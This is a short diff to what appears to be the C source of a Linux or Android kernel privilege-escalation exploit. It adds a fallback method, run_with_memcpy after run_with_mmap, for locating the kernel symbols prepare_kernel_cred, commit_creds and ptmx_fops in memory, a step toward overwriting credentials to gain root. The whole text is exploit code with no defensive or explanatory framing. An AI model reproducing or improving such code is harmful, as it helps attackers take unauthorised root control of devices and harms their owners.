@@ -136,7 +136,10 @@ setup_variables(void)
   }
 
   printf("Try to find address in memory...\n");
-  run_with_mmap(find_variables_in_memory);
+  if (!run_with_mmap(find_variables_in_memory)) {
+    printf("\n");
+    run_with_memcpy(find_variables_in_memory);
+  }
 
   if (prepare_kernel_cred && commit_creds && ptmx_fops) {
     printf("  prepare_kernel_cred = %p\n", prepare_kernel_cred);
